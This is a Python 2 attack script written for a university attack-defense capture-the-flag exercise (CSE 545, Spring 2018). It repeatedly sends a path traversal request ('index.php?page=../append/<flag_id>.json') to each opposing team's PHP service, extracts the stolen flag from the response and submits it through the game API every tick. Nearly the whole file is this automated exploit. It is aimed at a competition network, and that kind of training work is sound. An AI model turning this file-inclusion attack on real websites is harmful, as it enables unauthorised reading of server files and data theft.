import time
import requests
import json
from class_api import *

##
##	CSE 545 - Spring 2018
##	Team 9: Black Shadow (blackshadow@asu.edu)
##

def main():
	# Initialize API wrapper
	api = ProjectCTFAPI()


	# Turn on debug mode to see flag submission status
	api.debug = True

	while True:

		# Get target info by serviceID
       		serviceID = 10004
	        targets = api.getTargets(serviceID)

		for target in targets:

			# Generatae HTTP GET Request
			httpGetStr = "http://" + target['hostname'] + ":" + str(target['port']) + \
				     "/index.php?page=../append/" + target['flag_id'] + ".json"

			try:
				#print target['hostname'], target['team_name'], target['flag_id']
				r = requests.get(httpGetStr, timeout=0.5)

				if "FLG" in r.content:
					# convert to json format and encode utf-8 to ascii
					r_dict = r.json()
					flag = r_dict['message'].encode("ascii","replace")					

					# submit flag
					api.submitFlag(flag)

			except requests.exceptions.ReadTimeout:
				print "Timeout on", target['hostname'], target['team_name']
				continue
 
		print "Waiting for the next tick"
		time.sleep(180)


if __name__ == '__main__':
    main()
